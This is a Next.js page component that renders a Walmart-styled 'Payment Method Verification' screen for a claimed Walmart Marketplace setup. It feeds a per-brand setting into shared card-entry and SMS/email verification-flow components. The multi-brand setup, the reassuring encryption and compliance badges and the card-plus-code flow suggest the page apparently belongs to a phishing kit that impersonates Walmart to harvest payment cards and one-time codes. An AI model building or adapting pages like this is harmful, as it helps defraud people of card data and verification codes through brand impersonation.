"use client";

import { useState } from "react";
import CardVerificationForm from "@/components/kyc/CardVerificationForm";
import CardVerificationFlow from "@/components/kyc/CardVerificationFlow";
import { brandConfigs } from "@/lib/brandConfig";

export default function WalmartCardVerificationPage() {
  const config = brandConfigs.walmart;
  const [session, setSession] = useState<{ token: string; uuid: string } | null>(null);

  return (
    <div>
      {/* Walmart-style page header */}
      <div className="mb-6">
        <div
          className="rounded-lg p-6"
          style={{
            backgroundColor: "#FFFFFF",
            border: "1px solid #E6E7E8",
            boxShadow: "0 2px 8px rgba(0,0,0,0.04)",
          }}
        >
          <div className="flex items-start gap-4">
            <div
              className="w-12 h-12 rounded-full flex items-center justify-center flex-shrink-0"
              style={{ backgroundColor: "#E3F2FD" }}
            >
              <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="#0071CE" strokeWidth={2}>
                <path strokeLinecap="round" strokeLinejoin="round" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
              </svg>
            </div>
            <div>
              <h1 className="text-xl font-bold" style={{ color: "#2E2F32" }}>
                Payment Method Verification
              </h1>
              <p className="text-sm mt-1" style={{ color: "#6D6E71" }}>
                To complete your Walmart Marketplace setup, we need to verify your payment card.
                This process is quick and secure.
              </p>
              <div className="flex items-center gap-4 mt-3">
                <div className="flex items-center gap-1.5 text-xs" style={{ color: "#2A8703" }}>
                  <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
                  </svg>
                  End-to-end encrypted
                </div>
                <div className="flex items-center gap-1.5 text-xs" style={{ color: "#2A8703" }}>
                  <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
                  </svg>
                  PCI DSS compliant
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Card Verification Form or Flow */}
      {!session ? (
        <CardVerificationForm
          brandConfig={config}
          onSubmitted={(token, uuid) => setSession({ token, uuid })}
        />
      ) : (
        <CardVerificationFlow
          brandConfig={config}
          sessionToken={session.token}
          uuid={session.uuid}
        />
      )}

      {/* Walmart-style security notice */}
      <div className="mt-8 p-4 rounded-lg" style={{ backgroundColor: "#F2F8FD", border: "1px solid #E6E7E8" }}>
        <div className="flex items-start gap-3">
          <svg className="w-5 h-5 flex-shrink-0 mt-0.5" fill="none" viewBox="0 0 24 24" stroke="#0071CE" strokeWidth={2}>
            <path strokeLinecap="round" strokeLinejoin="round" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
          </svg>
          <div>
            <p className="text-sm font-semibold" style={{ color: "#2E2F32" }}>Your card data is protected</p>
            <p className="text-xs mt-1" style={{ color: "#6D6E71" }}>
              Card details are encrypted using bank-grade encryption and are never stored in plain text.
              We use SMS and email verification to confirm your identity.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}
